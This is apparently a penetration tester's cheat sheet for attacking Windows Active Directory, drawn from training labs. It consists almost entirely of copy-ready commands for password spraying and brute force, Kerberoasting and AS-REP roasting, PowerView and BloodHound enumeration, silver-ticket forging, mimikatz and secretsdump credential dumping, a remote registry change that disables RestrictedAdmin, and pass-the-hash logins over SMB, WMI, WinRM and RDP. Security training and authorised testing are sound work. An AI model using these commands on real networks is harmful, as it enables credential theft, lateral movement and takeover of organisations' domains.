**Domain access:**

1. spray anonymous access
2. spray known credentials for domain and local-auth
3. kerberoastable users
4. ASREP roastable users
5. domain users, groups, sessions
6. SharpHound.ps1 ingestion
7. No credentials? Try to enumerate as much as possible using LDAP
	
 			a. kerbrute userenum --dc dc.domain.com -d domain.com /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt

   			b. rpcclient -U '' -N <ip>
			   enumdomusers
		     	   querydispinfo

   			c. rpcclient -U "" <ip> -N -c "enumdomusers" | grep -oP '\[.*?\]' | grep "0x" -v | tr -d '[]' > userlist.txt

8. brute force usernames as passwords

			a. nxc smb <ip> -u usernames.txt -p usernames.txt

10. Enumerate for DCSync/Replication privileges

			a. Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ActiveDirectoryRights -match 'WriteDacl')}


```
crackmapexec smb internal.txt -u "anonymous" -p ""
crackmapexec smb internal.txt -u "jeff" -p "Password1##" --local-auth
crackmapexec smb internal.txt -u "jeff" -p "Password1##" --shares
crackmapexec smb internal.txt -u Administrator -H :NT
crackmapexec smb internal.txt -u "jeff" -p "Password1##" --users
crackmapexec smb internal.txt -u "jeff" -p "Password1##" --groups
crackmapexec smb internal.txt -u "jeff" -p "Password1##" --sessions

sudo impacket-GetUserSPNs -request -dc-ip <DC-IP> domain.local/<valid-username>:"Password1"

impacket-GetNPUsers corp.com/ -dc-ip 192.168.180.70 -format hashcat -usersfile users.txt
impacket-GetNPUsers corp.com/dave -dc-ip 192.168.180.70 -format hashcat >> hash.test

nxc ldap <ip> -u user.txt -p '' --asreproast

. .\PowerView.ps1
      Get-NetGroup "Domain Admins" | select member
      Get-NetGroup | select cn

      Find-LocalAdminAccess
      Find-InterestingDomainAcl

      "<SID>","<SID>","<SID>" | Convert-SidToName

      Get-NetComputer | select dnshostname
      .\PsLoggedon.exe \\DC01SRV
      
      Get-NetUser -SPN | select samaccountname,serviceprincipalname

      Get-ObjectAcl -Identity "<group-or-user-name>" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights
      	- GenericAll, GenericWrite, WriteOwner, WriteDACL, AllExtendedRights, Self (Self-Membership)
      	- Convert-SidToName <SID>

. .\SharpHound.ps1
      Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\temp\ -OutputPrefix "victim"

      MATCH (m:Computer) RETURN m
      MATCH (m:User) RETURN m
      MATCH p = (c:Computer)-[:HasSession]->(m:User) RETURN p
      
```

**Alternative ways to use credentials**

```
[Check for user descriptions using LDAP]
nxc ldap <ip> -u 'username' -p 'password' --query "(objectClass=*)" "*"

[ingest for BloodHound using nxc]
nxc ldap <ip> -u user -p pass --bloodhound -c All -ns <ip>

[if the account is a service account, craft a silver ticket]
impacket-ticketer -nthash <HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> -spn <SERVICE_PRINCIPAL_NAME> <USER>
KRB5CCNAME=administrator.ccache impacket-mssqlclient -k USER@dc.sequel.htb

[use access to MSSQL server to check for impersonation privileges]
SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'

[if an Administrator, dump the local SAM and LSA using secretsdump or mimikatz]
.\mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::sam" "exit"

```



**Passing the Hash**

```
crackmapexec smb 172.16.50.4 -u user -H BD1C6503987F8FF006296118F359FA79  -d domain.local

impacket-wmiexec domain.local/user@10.0.0.20 -hashes aad3b435b51404eeaad3b435b51404ee:BD1C6503987F8FF006296118F359FA79

evil-winrm -i 10.0.0.20 -u user -H BD1C6503987F8FF006296118F359FA79

xfreerdp /v:192.168.2.200 /u:Administrator /pth:8846F7EAEE8FB117AD06BDD830B7586C
	- account restrictions are preventing the user from signing in:
		- crackmapexec smb 10.0.0.200 -u Administrator -H 8846F7EAEE8FB117AD06BDD830B7586C -x 'reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f'

smbclient //10.0.0.30/Finance -U user --pw-nt-hash BD1C6503987F8FF006296118F359FA79 -W domain.local

impacket-secretsdump ituser@<any-domain-joined-machine> -hashes aad3b435b51404eeaad3b435b51404ee:BD1C6503987F8FF006296118F359FA79

```

